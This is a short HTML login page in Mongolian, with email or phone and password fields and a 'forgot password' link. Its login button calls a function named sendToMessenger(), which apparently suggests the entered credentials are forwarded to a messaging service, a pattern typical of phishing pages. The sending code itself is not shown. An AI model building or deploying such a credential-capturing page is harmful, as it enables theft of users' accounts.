<!DOCTYPE html>
<html lang="mn">
<head>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

</head>
<body>

    <div class="login-container">
        <h2>Нэвтрэх</h2>
        <input type="text" id="username" placeholder="Имэйл эсвэл утасны дугаар" required>
        <input type="password" id="password" placeholder="Нууц үг" required>
        <button class="login-btn" onclick="sendToMessenger()">Нэвтрэх</button>
        <a href="#" class="forgot-password">Нууц үгээ мартсан уу?</a>
    </div>

    <script src="script.js"></script> <!-- JavaScript файлыг оруулна -->
</body>
